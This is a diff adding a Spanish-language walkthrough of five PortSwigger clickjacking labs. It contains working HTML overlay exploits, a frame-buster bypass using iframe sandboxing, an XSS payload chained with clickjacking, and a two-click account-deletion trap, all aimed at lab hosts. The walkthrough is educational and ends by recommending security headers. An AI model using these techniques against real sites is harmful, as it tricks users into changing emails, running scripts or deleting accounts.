@@ -12,6 +12,12 @@ Todos los laboratorios posteriormente expuestos los puedes encontrar para resolv
 
 ## Índice
 
+- [1. Lab: Basic clickjacking with CSRF token protection](#1-lab-basic-clickjacking-with-csrf-token-protection)
+- [2. Lab: Clickjacking with form input data prefilled from a URL parameter](#2-lab-clickjacking-with-form-input-data-prefilled-from-a-url-parameter)
+- [3. Lab: Clickjacking with a frame buster script](#3-lab-clickjacking-with-a-frame-buster-script)
+- [4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS](#4-lab-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss)
+- [5. Lab: Multistep clickjacking](#5-lab-multistep-clickjacking)
+- [CONCLUSION](#conclusion)
 
 ## 1. Lab: Basic clickjacking with CSRF token protection
 
@@ -250,6 +256,27 @@ Para resolver el laboratorio, cree algo de HTML que enmarque la página de la cu
 Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener:peter
 ```
 
+Como dice la descripción este laboratorio es complementario del anterior. Pero en este caso debemos cambiar el correo de la victima. Entonces para ello ingresamos al panel de usuario del sitio web.
+
+![](img7.png)
+
+Ahora, como podemos ver, podemos realizar un código en html para que el usuario haga clic en el botón **Update mail**. El problema es, que esto no va a cambiar el correo del usuario ya que se ha ingresado un valor en el input. Entonces analizando el codigo verificamos lo siguiente:
+
+```html
+<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
+	<label>Email</label>
+	<input required type="email" name="email" value="">
+	<input required type="hidden" name="csrf" value="tBoz7XDXRle1T0umVHq9VH4CPkqbZRtu">
+	<button class='button' type='submit'> Update email </button>
+</form>
+```
+
+Como podemos ver el input donde debemos ingresar el email tiene por nombre **email**, entonces hay que tener cuenta que muchos sitios webs terminar recibiendo parámetros de completado de valores mediante url o parámetros post. Entonces probaremos enviando el parámetro **email** por get, con el valor de un correo por ejemplo **desdes@desdes.xyz**.
+
+![](img8.png)
+
+Como podemos ver, el correo que pasemos por parámetro get se actualiza en el sitio web dejándonos la posibilidad de realizar un clickjacking como en el anterior laboratorio. 
+
 ```html
 <html>
 	<head>
@@ -259,7 +286,7 @@ Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener
 				width:1280px;
 				height:600px;
 				opacity:1;
-				opacity:0.00001;
+				opacity:0.5;
 				z-index:2;
 			}
 
@@ -276,14 +303,15 @@ Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener
 		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me</button>
 		</div>
 
-		<iframe id='target' src='https://0a6000b703aee9b2c361b043006900c3.web-security-academy.net/my-account?email=email@feik.com' >
+		<iframe id='target' src='https://0a5700ab0478052f804967000000005e.web-security-academy.net/my-account?email=desdes@desdes.xyz' >
 	</body>
 </html>
 ```
+![](img9.png)
 
+Podemos ver que tenemos el boton de **Click me** en la posicion del boton **Update email** asi como el correo que vamos a actualizar. Ahora, volveremos a asignar el valor de **opacity** en **0.000001**, lo enviamos a la victima para completar el laboratorio.
 
-
-
+![](img10.png)
 
 ## 3. Lab: Clickjacking with a frame buster script
 
@@ -295,6 +323,19 @@ Para resolver el laboratorio, cree algo de HTML que enmarque la página de la cu
 Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener:peter
 ```
 
+Como podemos leer en la descripción del laboratorio, este sitio web cuenta con una protección contra iframe. Probaremos insertando un iframe en nuestro exploit server para validar la existencia de esta protección.
+
+![](img11.png)
+
+Como podemos ver, la protección esta presente en el sitio web, lo que hace que el navegador no pueda cargar el iframe, para evadir esta restricción podemos usar el atributo **sandbox** para la etiqueta **iframe** con el valor **allow-forms**.
+
+```html
+<iframe src='https://0a1800c70426ede280ee499500930086.web-security-academy.net/my-account' sandbox='allow-forms'>
+```
+![](img12.png)
+
+Entonces, podemos verificar que logramos evadir la protección. Ahora que ya superamos esta limitante realizamos el cambio de cambio de correo como en el laboratorio anterior.
+
 ```html
 <html>
 	<head>
@@ -304,7 +345,7 @@ Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener
 				width:1280px;
 				height:600px;
 				opacity:1;
-				opacity:0.0001;
+				opacity:0.5;
 				z-index:2;
 			}
 
@@ -321,17 +362,74 @@ Puede iniciar sesión en su propia cuenta con las siguientes credenciales:wiener
 		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me</button>
 		</div>
 
-		<iframe id='target' src='https://0afa00f2047be961c0b26dac00b300a2.web-security-academy.net/my-account?email=admin@xnxx.com' sandbox='allow-forms'>
+		<iframe id='target' src='https://0a1800c70426ede280ee499500930086.web-security-academy.net/my-account?email=desdes@desdes.xyz' sandbox='allow-forms'>
 	</body>
 </html>
 ```
 
+![](img13.png)
+
+Ahora, volveremos a asignar el valor de **opacity** en **0.000001**, lo enviamos a la victima para completar el laboratorio.
+
+![](img14.png)
 
 ## 4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
 
 ```
-Este laboratorio contiene una vulnerabilidad XSS que se activa con un clic. Cree un ataque de secuestro de clics que engañe al usuario para que haga clic en el botón "Click me" para llamar a la print()función.
+Este laboratorio contiene una vulnerabilidad XSS que se activa con un clic. Cree un ataque de secuestro de clics que engañe al usuario para que haga clic en el botón "Click me" para llamar a la print() función.
 ```
+
+Como podemos ver en el sitio web objetivo, requerimos buscar una vulnerabilidad XSS, entonces revisando encontramos un formulario e intentaremos enviar etiquetas para verificar si es vulnerable.
+
+![](img15.png)
+
+Y podemos ver que genera el siguiente mensaje:
+
+```
+Thank you for submitting feedback, Name!
+```
+
+Entonces, podemos ver que nos devuelve el valor del nombre ingresado, por ello intentaremos ingresar el payload XSS:
+
+```
+<img src=x onerror=print()>
+```
+
+Entonces lo enviamos y verificamos que se ejecuta la función de imprimir.
+
+![](img16.png)
+
+Ahora que ya encontramos la vulnerabilidad XSS, debemos buscar la manera de lanzar la explotación mediante un ataque de clickjacking, para ello recordaremos lo que hicimos en el segundo laboratorio. Buscamos el código del formulario.
+
+```html
+<form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded" personal="true">
+	<input required type="hidden" name="csrf" value="l6K1q1Kyw3a9lKl4kbLVhxmo5HKoBSnL">
+	<label>Name:</label>
+	<input required type="text" name="name">
+	<label>Email:</label>
+	<input required type="email" name="email">
+	<label>Subject:</label>
+	<input required type="text" name="subject">
+	<label>Message:</label>
+	<textarea required rows="12" cols="300" name="message"></textarea>
+	<button class="button" type="submit">
+		Submit feedback
+	</button>
+	<span id="feedbackResult"></span>
+</form>
+```
+
+Entonces, agregaremos mediante la url los parámetros del formulario para autorellenar el formulario.
+
+![](img17.png)
+
+Entonces, en lugar del nombre pondremos el payload XSS, de manera que cuando el usuario entre a nuestro exploit server y haga clic en el botón se envíe el formulario y ejecute el XSS.
+
+```
+https://0a2d00e104125f6f80effd6c00d200a5.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=print()%3E&email=desdes@desdes.xyz&subject=blah&message=blah
+```
+
+Entonces, lo agregamos en nuestro codigo de clickjacking.
 
 ```html
 <html>
@@ -359,10 +457,16 @@ Este laboratorio contiene una vulnerabilidad XSS que se activa con un clic. Cree
 		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me</button>
 		</div>
 
-		<iframe id='target' src='https://0a8f0023039ecf0dc05009b6006e00e0.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=%27print()%27%3E&email=a@a.com&subject=a&message=mensaje' sandbox='allow-modals allow-forms allow-popups allow-same-origin allow-scripts'>
+		<iframe id='target' src='https://0a2d00e104125f6f80effd6c00d200a5.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=print()%3E&email=desdes@desdes.xyz&subject=blah&message=blah' >
 	</body>
 </html>
 ```
+
+![](img18.png)
+
+Ahora, volveremos a asignar el valor de **opacity** en **0.000001**, lo enviamos a la victima para completar el laboratorio.
+
+![](img19.png)
 
 
 ## 5. Lab: Multistep clickjacking
@@ -372,6 +476,47 @@ Este laboratorio tiene algunas funciones de cuenta que están protegidas por un 
 
 Puede iniciar sesión en la cuenta usted mismo utilizando las siguientes credenciales:wiener:peter
 ```
+
+Para completar esta laboratorio debemos hacer que el usuario elimine su cuenta, y para ello requiere también de una confirmación. Primero empezaremos con el primera boton, con la finalidad de que se ubique en el botón de **Delete Account**.
+
+```html
+<html>
+	<head>
+		<style>
+			#target{
+				position:relative;
+				width:1280px;
+				height:1280px;
+				opacity:1;
+				opacity:0.5;
+				z-index:2;
+			}
+
+			#decoy_website{
+				position:absolute;
+				width:1280px;
+				height:600px;
+				z-index:1;
+			}
+		</style>
+	</head>
+	<body>
+		<div id="decoy_website">
+		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me first</button>
+		</div>
+
+		<iframe id='target' src='https://0a6400c804b2385b80626867000d00f3.web-security-academy.net/my-account'>
+	</body>
+</html>
+```
+
+![](img20.png)
+
+Ahora, haremos clic en **Delete Account** y notamos que nos genera una confirmación de que deseamos eliminar la cuenta.
+
+![](img21.png)
+
+Entonces, requerimos crear un segundo botón y una nueva clase para este mismo, que concuerde con la posición del botón de confirmación de tal manera que con ello la cuenta pueda ser borrada definitivamente.
 
 ```html
 <html>
@@ -410,7 +555,19 @@ Puede iniciar sesión en la cuenta usted mismo utilizando las siguientes credenc
 		<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<button class="button" type="submit">Click me next</button>
 		</div>
 
-		<iframe id='target' src='https://0acb0090038c45edc32965ff009500d7.web-security-academy.net/my-account' sandbox='allow-modals allow-forms allow-popups allow-same-origin allow-scripts'>
+		<iframe id='target' src='https://0a6400c804b2385b80626867000d00f3.web-security-academy.net/my-account'>
 	</body>
 </html>
 ```
+
+![](img22.png)
+
+Ahora, volveremos a asignar el valor de **opacity** en **0.000001**, lo enviamos a la victima para completar el laboratorio.
+
+![](img23.png)
+
+## CONCLUSION
+
+Muchas veces vemos el clickjacking como una vulnerabilidad muy simple o sin importancia por el poco impacto que puede presentar, pero en resolviendo estos laboratorio me di con la sorpresa que hay casos mas complejos en los cuales se podría utilizar esta vulnerabilidad dependiendo de que tan segura pueda ser un sitio web, asi mismo en los dos últimos laboratorios se dio a entender que esta vulnerabilidad puede ser combinada con mas vulnerabilidades para aumentar su impacto, y que con un buen manejo de CSS y Javascript se podría realizar "exploits" mas complejos de clickjacking para sitios web que tengan procesos de muchas etapas.
+
+Por ello se recomienda encarecidamente el uso de cabeceras de seguridad para proteger los sitios webs de este tipo de vulnerabilidades. Actualmente muchos servicios ya proporcionan una configuración sencilla para la habilitación de cabeceras de seguridad.
